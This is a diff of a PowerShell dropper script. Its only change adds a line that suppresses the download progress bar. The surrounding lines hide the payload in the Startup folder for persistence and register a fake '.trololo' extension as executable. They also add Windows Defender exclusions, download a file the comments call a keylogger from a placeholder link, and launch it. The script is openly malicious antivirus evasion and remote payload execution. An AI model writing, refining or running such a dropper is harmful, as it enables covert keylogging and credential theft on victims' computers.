@@ -1,6 +1,7 @@
 Set-Location $env:APPDATA\Microsoft\Windows\"Start Menu"\Programs\Startup #Go to the folder in which we will donwload files
 cmd /c C:\Windows\System32\reg.exe add HKLM\Software\Classes\.trololo /ve /d "exefile" /f
 Add-MpPreference -ExclusionExtension trololo -Force #Add exception for .exe files in antivirus
+$ProgressPreference = 'SilentlyContinue' #Fast download!
 Invoke-WebRequest LINK -O definetly_not_a_keylogger.trololo #Download definetly_not_a_keylogger.trololo script
 Add-MpPreference -ExclusionPath $env:APPDATA\Microsoft\Windows\"Start Menu"\Programs\Startup\definetly_not_a_keylogger.trololo -Force #Add exception for definetly_not_a_keylogger.trololo file in antivirus
 Start-Process definetly_not_a_keylogger.trololo #Start keylogger script
